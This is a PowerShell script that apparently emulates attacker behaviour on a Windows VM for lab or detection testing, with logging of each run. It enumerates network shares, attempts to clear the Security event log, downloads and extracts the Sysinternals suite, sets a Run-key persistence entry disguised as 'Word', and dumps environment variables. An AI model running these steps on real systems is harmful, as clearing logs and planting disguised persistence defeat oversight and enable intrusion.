class Invader{
    
    [int32]$time

    Invader(){}
    # grab user
    [string] grabUser(){
        $unrefineduser = whoami.exe
        $userArr = $unrefineduser -split "\\"
        return $userArr[1]
    }
    # sleep for this amount of time
    sleep([int]$min, [int]$max){
        $this.time = Get-Random -Minimum $min -Maximum $max
        Start-Sleep -Seconds $this.time
    }
    #attempt to check the shared drives
    view_shared_drives(){
        $share = net share
        Write-Host $share
    }
    # attempt to clear the event log, catch if restricted
    clear_event_log(){
        try{
            Clear-EventLog -logName Security
            }
        catch [System.Security.SecurityException]{
            "BAD"
        }
    } 
    # download a file, extract it, set registry key, remove evidence
    set_reg_key(){
        try{
            $user = $this.grabUser()
            $path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
            $name = "Word"
            $exe = "C:\Users\$user\SavedGames\sys\Sysmon.exe"
            (New-Object System.Net.WebClient).DownloadFile("https://download.sysinternals.com/files/SysinternalsSuite.zip", "C:\Users\$user\Downloads\sys.zip")
            Expand-Archive -LiteralPath "C:\Users\$user\Downloads\sys.zip" -DestinationPath "C:\Users\$user\sys" -Force
            Remove-Item "C:\Users\$user\Downloads\sys.zip"
            Set-ItemProperty -Path $path -Name $name -Value $exe
        }catch [System.Security.SecurityException]{
            ""
        }
    }
    # check environment variables
    check_env(){
        Get-ChildItem Env:
    }
}
# do stuff
$Invade = New-Object -TypeName Invader
$Invade.sleep(10,20)
$Invade.view_shared_drives()
$Invade.sleep(10,20)
$Invade.clear_event_log()
$Invade.sleep(10,20)
$Invade.set_reg_key()
$Invade.sleep(10,20)
$Invade.check_env()
$Invade.sleep(10,20)

# Logging starts here
# Get VM unique identifier, current time, and script name
$vmID = (Get-WmiObject -Class Win32_ComputerSystem).Name
$currentTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
$scriptName = $MyInvocation.MyCommand.Name

# Define the path for the log file
$logPath = "C:\Users\User1\Desktop\logs\logFile.log"

# Format the log entry
$logEntry = "VM ID: $vmID, Time: $currentTime, Script: $scriptName"

# Write log entry to the log file
Add-Content -Path $logPath -Value $logEntry


Write-Host "Log file saved."